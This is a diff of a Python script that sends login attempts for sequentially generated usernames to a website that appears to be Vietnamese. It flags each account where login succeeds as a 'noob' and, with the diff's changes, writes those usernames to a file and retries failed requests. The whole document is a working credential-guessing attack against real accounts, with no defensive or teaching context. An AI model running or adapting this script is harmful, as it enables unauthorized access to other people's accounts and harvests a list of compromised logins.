@@ -14,10 +14,12 @@ cookies = {
     'ASP.NET_SessionId': '5iqxbpsfj12cbs3zyzlhtt3j'
 }
 
+f = open('out.txt', 'w+')
+
 i = 1
 noob_count = 0
 retries = 0
-prefix = '1802'
+prefix = '1702'
 while i < 2000:
     s = requests.Session()
     username = prefix + str(i).zfill(4)
@@ -27,12 +29,18 @@ while i < 2000:
         'LoginName': '{}'.format(username),
         'Password': '{}'.format(password)
     }
-    r = s.post(url, cookies=cookies, data=payload)
+    try:
+        r = s.post(url, cookies=cookies, data=payload)
+    except:
+        i -= 1
+        continue
 
     if r.status_code == 200:
         if not 'Đăng nhập' in r.text:
-            name = Selector(text=r.text).xpath('//span[@class="user-name"]/text()').get()[11:]
-            print('Noob found: ', username, ' -', name)
+            name = Selector(text=r.text).xpath(
+                '//span[@class="user-name"]/text()').get()[11:]
+            print('Noob found: ', username, '-', name)
+            f.write(username + '\n')
             noob_count += 1
             retries = 0
     else:
@@ -46,3 +54,4 @@ while i < 2000:
         i -= 1
     i += 1
 print("Total noobs:", noob_count)
+f.close()
